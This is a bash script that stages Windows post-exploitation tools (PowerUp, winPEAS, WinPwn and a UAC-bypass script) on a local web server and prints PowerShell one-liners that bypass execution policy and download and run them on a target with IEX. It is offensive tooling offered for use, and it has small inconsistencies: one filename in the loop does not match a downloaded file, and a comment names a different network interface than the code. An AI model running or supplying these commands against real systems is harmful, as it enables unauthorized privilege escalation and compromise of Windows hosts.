#!/bin/bash

# Function to kill processes on port 8080
kill_port_8080() {
    pids=$(lsof -ti:8080)
    if [ -n "$pids" ]; then
        echo "Killing processes on port 8080:"
        echo "$pids" | xargs -r kill -9
        sleep 1
    else
        echo "No processes found on port 8080"
    fi
}

# Kill processes on port 8080
kill_port_8080

# Set up web server directory
mkdir -p /tmp/exploit_server
cd /tmp/exploit_server || exit 1

# Download scripts with error handling
download_script() {
    local url=$1
    local output=$2
    if ! wget -q --show-progress "$url" -O "$output"; then
        echo "Failed to download $output"
        return 1
    fi
}

# Download required scripts
download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "/tmp/exploit_server/powerup.ps1"
download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/winpeas.ps1"
download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/winpwn.ps1"
download_script "https://github.com/paulkwalton/thescriptvault/blob/cf3ec0d2fddd057b0f37e231f6515635e8918db8/privesc/windows/uac-bypass.ps1" "/tmp/exploit_server/uac-bypass.ps1"

chmod 755 -R /tmp/exploit_server

# Get the IP address from tun0 interface
IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$IP" ]; then
    echo "Error: interface not found or no IP address assigned."
    exit 1
fi

# Define color codes
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored PowerShell commands
print_command() {
    echo -e "${BLUE}$1${NC}"
    echo "----------------------------------------"
}

# Print PowerShell bypass commands
echo "PowerShell Bypass Commands:"
echo "============================"

for script in powersploit.ps1 winpeas.ps1 winpwn.ps1; do
    url="http://$IP:8080/$script"
    echo "Commands for $script:"
    echo "--------------------"
    
    # Method 1: Standard IEX with WebClient
    print_command "powershell -nop -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('$url'))\""
    echo
done


# Start the web server
python3 -m http.server 8080 -d /tmp/exploit_server
